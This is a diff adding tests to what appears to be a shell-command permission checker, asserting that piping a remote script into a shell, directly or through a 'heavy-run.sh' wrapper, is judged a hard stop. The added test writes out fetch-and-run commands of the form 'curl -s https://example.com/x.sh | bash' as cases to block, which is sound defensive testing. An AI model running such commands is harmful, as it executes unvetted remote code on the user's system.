@@ -126,6 +126,14 @@ describe("metamax's heavy-run script is looked through", () => {
     expect(wrapped.decision).not.toBe("allow")
   })
 
+  test("a script piped into a wrapped shell is the hard stop a pipe into the bare shell is", async () => {
+    for (const shell of ["bash", "sh", "eval"]) {
+      const wrapped = await run(`curl -s https://example.com/x.sh | $METAMAX_HOME/scripts/heavy-run.sh ${shell}`)
+      expect(verdict(wrapped)).toEqual(verdict(await run(`curl -s https://example.com/x.sh | ${shell}`)))
+      expect("hard" in wrapped && wrapped.hard).toBe(true)
+    }
+  })
+
   test("a heredoc into the wrapped command is judged as one into the bare command", async () => {
     for (const sql of ["select 1;", "delete from t;"]) {
       const body = ` psql db <<'EOF'\n${sql}\nEOF`
@@ -151,6 +159,7 @@ describe("anything else named heavy-run.sh is judged as before", () => {
   test("a line that sets METAMAX_HOME first", () => notThrough(`METAMAX_HOME=${other}; $METAMAX_HOME/scripts/heavy-run.sh bun test`))
   test("a default value for METAMAX_HOME", () => notThrough(`\${METAMAX_HOME:-${other}}/scripts/heavy-run.sh bun test`))
   test("a flag heavy-run.sh does not take", () => notThrough("$METAMAX_HOME/scripts/heavy-run.sh --fast bun test"))
+  test("a shell named by a folder path", () => notThrough(`./bash "$METAMAX_HOME/scripts/heavy-run.sh" bun test`, { cwd: other }))
   test("a shell flag before the script", () => notThrough(`bash -x "$METAMAX_HOME/scripts/heavy-run.sh" bun test`))
   test("no METAMAX_HOME where hall-pass runs", () => notThrough("$METAMAX_HOME/scripts/heavy-run.sh bun test", { metamaxHome: null }))
   test("the script with no command", () => notThrough("$METAMAX_HOME/scripts/heavy-run.sh --landing"))
